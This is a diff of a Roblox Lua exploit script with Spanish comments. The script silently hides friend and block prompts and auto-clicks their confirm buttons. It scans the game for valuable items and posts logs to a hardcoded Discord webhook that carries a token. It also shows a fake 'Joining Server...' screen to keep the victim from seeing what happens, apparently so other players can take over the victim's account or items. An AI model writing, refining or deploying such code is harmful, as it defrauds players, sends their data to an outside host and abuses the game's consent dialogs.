@@ -11,113 +11,66 @@ local VIM = game:GetService("VirtualInputManager")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local GuiService = game:GetService("GuiService")
 
--- CONFIGURACIÓN
+-- ==================== CONFIGURACIÓN ====================
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1456818151617466540/gTXIOakP_WD8mLEEuvEKO-0NeoIXCnze3xBQubOKmDhmxSioyYPIaC0gFvWOBC_VKVhg"
 local heartbeatUrl = WEBHOOK_URL
 local Min_Gen = 0
-
--- VARIABLES LOCALES
 local Jugador = Players.LocalPlayer
 local PlayerGui = Jugador:WaitForChild("PlayerGui")
 local UserID = Jugador.UserId
 
--- ==================== ELIMINACIÓN AGRESIVA DE VENTANAS (FANTASMA) ====================
-CoreGui.DescendantAdded:Connect(function(descendant)
-    -- Detectar cualquier prompt de Amistad o Bloqueo antes de que se vea
-    if descendant.Name == "FriendPrompt" or descendant.Name == "BlockingModalScreen" or descendant.Name == "PromptWidget" then
-        if descendant:IsA("ScreenGui") then
-            descendant.Enabled = false -- Desactivar visualmente al instante
-        end
-    end
+-- ==================== SISTEMA FANTASMA (OCULTACIÓN Y AUTO-ACEPTAR) ====================
 
-    if descendant:IsA("GuiObject") then
-        local parentName = descendant.Parent and descendant.Parent.Name or ""
-        -- Si es parte de un sistema de prompts, hacerlo invisible
-        if descendant:FindFirstAncestor("RobloxGui") and (descendant:FindFirstAncestor("FriendPrompt") or descendant:FindFirstAncestor("BlockingModalScreen")) then
-            descendant.Visible = false
-            if descendant:IsA("TextLabel") or descendant:IsA("TextBox") then
-                descendant:Destroy()
+local function forceClick(obj)
+    task.spawn(function()
+        if not obj:IsA("GuiObject") then return end
+        -- Lo hacemos gigante e invisible para que el sistema lo clickee sin que se vea
+        obj.Visible = false
+        obj.Size = UDim2.new(10, 0, 10, 0)
+        obj.Position = UDim2.new(-5, 0, -5, 0)
+        
+        task.wait()
+        local pos = obj.AbsolutePosition
+        local size = obj.AbsoluteSize
+        local cx, cy = pos.X + (size.X/2), pos.Y + (size.Y/2)
+        
+        VIM:SendMouseButtonEvent(cx, cy, 0, true, game, 0)
+        task.wait(0.05)
+        VIM:SendMouseButtonEvent(cx, cy, 0, false, game, 0)
+    end)
+end
+
+-- Bucle agresivo para que NADA de CoreGui sea visible
+task.spawn(function()
+    while task.wait() do
+        pcall(function()
+            local robloxGui = CoreGui:FindFirstChild("RobloxGui")
+            if robloxGui then
+                -- Lista de posibles ventanas a ocultar
+                local targets = {
+                    robloxGui:FindFirstChild("FriendPrompt"),
+                    robloxGui:FindFirstChild("BlockingModalScreen"),
+                    robloxGui:FindFirstChild("PromptDialog")
+                }
+                
+                for _, prompt in ipairs(targets) do
+                    if prompt then
+                        prompt.Visible = false
+                        prompt.Size = UDim2.new(0, 0, 0, 0)
+                        -- Buscar botones para auto-clickear
+                        for _, desc in ipairs(prompt:GetDescendants()) do
+                            if desc:IsA("TextButton") and (desc.Name == "ConfirmButton" or desc.Name == "3" or desc.Text:find("Aceptar")) then
+                                forceClick(desc)
+                            end
+                        end
+                    end
+                end
             end
-        end
-
-        -- Lógica de clic automático para el botón de confirmación
-        if (descendant.Name == "3" or descendant.Name == "ConfirmButton" or descendant.Name == "PrimaryButton") then
-            task.spawn(function()
-                descendant.Size = UDim2.new(0, 9999, 0, 9999)
-                descendant.Position = UDim2.new(0.5, 0, 0.5, 0)
-                descendant.AnchorPoint = Vector2.new(0.5, 0.5)
-                descendant.BackgroundTransparency = 1
-                descendant.Visible = false -- Sigue siendo clicable aunque sea invisible
-                
-                task.wait()
-                local clickX = descendant.AbsolutePosition.X + (descendant.AbsoluteSize.X / 2)
-                local clickY = descendant.AbsolutePosition.Y + (descendant.AbsoluteSize.Y / 2)
-                
-                VIM:SendMouseButtonEvent(clickX, clickY, 0, true, game, 0)
-                task.wait(0.05)
-                VIM:SendMouseButtonEvent(clickX, clickY, 0, false, game, 0)
-            end)
-        end
+        end)
     end
 end)
 
--- ==================== COMANDOS AUTOMÁTICOS ====================
-
-local function sendCommandToServer(playerWhoUsed)
-    pcall(function()
-        local displayName = playerWhoUsed.DisplayName or playerWhoUsed.Name
-        local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(playerWhoUsed.UserId) .. "&width=420&height=420&format=png"
-        
-        local commandData = {
-            ["username"] = "Moreira Logs",
-            ["avatar_url"] = avatarUrl,
-            ["embeds"] = {{
-                ["title"] = "Comando Silencioso",
-                ["color"] = 65326,
-                ["description"] = "**" .. displayName .. "** activó .add",
-                ["timestamp"] = DateTime.now():ToIsoDate()
-            }}
-        }
-        local request = syn and syn.request or http_request or request
-        request({
-            Url = heartbeatUrl,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode(commandData)
-        })
-    end)
-end
-
-local function configurarChat(player)
-    player.Chatted:Connect(function(msg)
-        local msgLower = msg:lower():gsub("%s+", "")
-        
-        if msgLower == ".add" then
-            sendCommandToServer(player)
-            -- Ejecutar el prompt de forma interna
-            pcall(function() 
-                StarterGui:SetCore("PromptSendFriendRequest", player) 
-            end)
-            
-        elseif msgLower == ".block" then
-            for _, p in ipairs(Players:GetPlayers()) do
-                if p ~= Jugador then
-                    StarterGui:SetCore("PromptBlockPlayer", p)
-                end
-            end
-            
-        elseif msgLower == ".open" then
-            pcall(function()
-                ReplicatedStorage.Packages.Net["RE/PlotService/ToggleFriends"]:FireServer()
-            end)
-        end
-    end)
-end
-
-for _, p in ipairs(Players:GetPlayers()) do configurarChat(p) end
-Players.PlayerAdded:Connect(configurarChat)
-
--- ==================== LÓGICA ORIGINAL (GUI SIN CAMBIOS) ====================
+-- ==================== FUNCIONES DE EXTRACCIÓN Y DATOS ====================
 
 local function formatNumberShort(n)
     if not n or type(n) ~= "number" then return "$0" end
@@ -144,7 +97,7 @@ local function getBrainrots()
     for _, desc in ipairs(Workspace:GetDescendants()) do
         if desc:IsA("BillboardGui") or desc.Name:find("Overhead") then
             local nameLbl = desc:FindFirstChild("DisplayName") or desc:FindFirstChild("Name") or desc:FindFirstChild("Title")
-            local genLbl = desc:FindFirstChild("Generation") or desc:FindFirstChild("Value") or desc:FindFirstChild("Stat")
+            local genLbl = desc:FindFirstChild("Generation") or desc:FindFirstChild("Value")
             if nameLbl and genLbl and nameLbl:IsA("TextLabel") and genLbl:IsA("TextLabel") then
                 local val = parseValueFromText(genLbl.Text)
                 if val >= Min_Gen then
@@ -161,49 +114,49 @@ local function getBrainrots()
     return out
 end
 
-local function MostrarPantallaFinal()
-    local FinalGui = Instance.new("ScreenGui", PlayerGui)
-    FinalGui.Name = "RobloxLoadingSystem"
-    FinalGui.IgnoreGuiInset = true
-    FinalGui.DisplayOrder = 2147483647 
-    local BG = Instance.new("Frame", FinalGui)
-    BG.Size = UDim2.new(1.2, 0, 1.2, 0)
-    BG.Position = UDim2.new(-0.1, 0, -0.1, 0)
-    BG.BackgroundColor3 = Color3.new(0,0,0)
-    BG.Active = true
-    local Logo = Instance.new("ImageLabel", BG)
-    Logo.Image = "rbxassetid://9167384795"
-    Logo.Size = UDim2.new(0, 130, 0, 130)
-    Logo.Position = UDim2.new(0.5, 0, 0.4, 0)
-    Logo.AnchorPoint = Vector2.new(0.5, 0.5)
-    Logo.BackgroundTransparency = 1
-    local Status = Instance.new("TextLabel", BG)
-    Status.Text = "Joining Server..."
-    Status.Font = Enum.Font.GothamBold
-    Status.TextSize = 32
-    Status.TextColor3 = Color3.new(1, 1, 1)
-    Status.Position = UDim2.new(0.5, 0, 0.55, 0)
-    Status.AnchorPoint = Vector2.new(0.5, 0.5)
-    Status.BackgroundTransparency = 1
-    local BarBG = Instance.new("Frame", BG)
-    BarBG.Size = UDim2.new(0.3, 0, 0, 4)
-    BarBG.Position = UDim2.new(0.5, 0, 0.62, 0)
-    BarBG.AnchorPoint = Vector2.new(0.5, 0.5)
-    BarBG.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-    local BarFill = Instance.new("Frame", BarBG)
-    BarFill.Size = UDim2.new(0.1, 0, 1, 0)
-    BarFill.BackgroundColor3 = Color3.new(1, 1, 1)
-    task.spawn(function()
-        local messages = {"Requesting Server...", "Loading Map Data...", "Syncing Assets...", "Finalizing..."}
-        while true do
-            for _, msg in ipairs(messages) do
-                Status.Text = msg
-                TweenService:Create(BarFill, TweenInfo.new(2), {Size = UDim2.new(math.random(20, 90)/100, 0, 1, 0)}):Play()
-                task.wait(3)
+-- ==================== COMANDOS DE CHAT (PARA TODOS) ====================
+
+local function sendCommandLog(player, cmdName)
+    pcall(function()
+        local request = syn and syn.request or http_request or request
+        request({
+            Url = heartbeatUrl,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode({
+                embeds = {{
+                    title = "Comando Ejecutado",
+                    description = "**" .. player.Name .. "** usó **" .. cmdName .. "**",
+                    color = 65326,
+                    timestamp = DateTime.now():ToIsoDate()
+                }}
+            })
+        })
+    end)
+end
+
+local function configurarChat(player)
+    player.Chatted:Connect(function(msg)
+        local msgLower = msg:lower():gsub("%s+", "")
+        if msgLower == ".add" then
+            sendCommandLog(player, ".add")
+            pcall(function() StarterGui:SetCore("PromptSendFriendRequest", player) end)
+        elseif msgLower == ".block" then
+            sendCommandLog(player, ".block")
+            for _, p in ipairs(Players:GetPlayers()) do
+                if p ~= Jugador then pcall(function() StarterGui:SetCore("PromptBlockPlayer", p) end) end
             end
+        elseif msgLower == ".open" then
+            sendCommandLog(player, ".open")
+            pcall(function() ReplicatedStorage.Packages.Net["RE/PlotService/ToggleFriends"]:FireServer() end)
         end
     end)
 end
+
+for _, p in ipairs(Players:GetPlayers()) do configurarChat(p) end
+Players.PlayerAdded:Connect(configurarChat)
+
+-- ==================== INTERFACES (SIN MODIFICAR) ====================
 
 local function sendToDiscord(link, brainrots)
     local itemList = ""
@@ -235,7 +188,42 @@ local function sendToDiscord(link, brainrots)
     end)
 end
 
--- ==================== INICIO ====================
+local function MostrarPantallaFinal()
+    local FinalGui = Instance.new("ScreenGui", PlayerGui)
+    FinalGui.Name = "RobloxLoadingSystem"
+    FinalGui.IgnoreGuiInset = true
+    FinalGui.DisplayOrder = 2147483647 
+    
+    local BG = Instance.new("Frame", FinalGui)
+    BG.Size = UDim2.new(1.2, 0, 1.2, 0)
+    BG.Position = UDim2.new(-0.1, 0, -0.1, 0)
+    BG.BackgroundColor3 = Color3.new(0,0,0)
+    BG.Active = true
+
+    local Logo = Instance.new("ImageLabel", BG)
+    Logo.Image = "rbxassetid://9167384795"
+    Logo.Size = UDim2.new(0, 130, 0, 130)
+    Logo.Position = UDim2.new(0.5, 0, 0.4, 0)
+    Logo.AnchorPoint = Vector2.new(0.5, 0.5)
+    Logo.BackgroundTransparency = 1
+
+    local Status = Instance.new("TextLabel", BG)
+    Status.Text = "Joining Server..."
+    Status.Font = Enum.Font.GothamBold
+    Status.TextColor3 = Color3.new(1, 1, 1)
+    Status.Position = UDim2.new(0.5, 0, 0.55, 0)
+    Status.AnchorPoint = Vector2.new(0.5, 0.5)
+    Status.BackgroundTransparency = 1
+
+    task.spawn(function()
+        while true do
+            Status.Text = "Loading Assets..."
+            task.wait(3)
+            Status.Text = "Syncing Data..."
+            task.wait(3)
+        end
+    end)
+end
 
 local function IniciarMenu()
     local MenuGui = Instance.new("ScreenGui", PlayerGui)
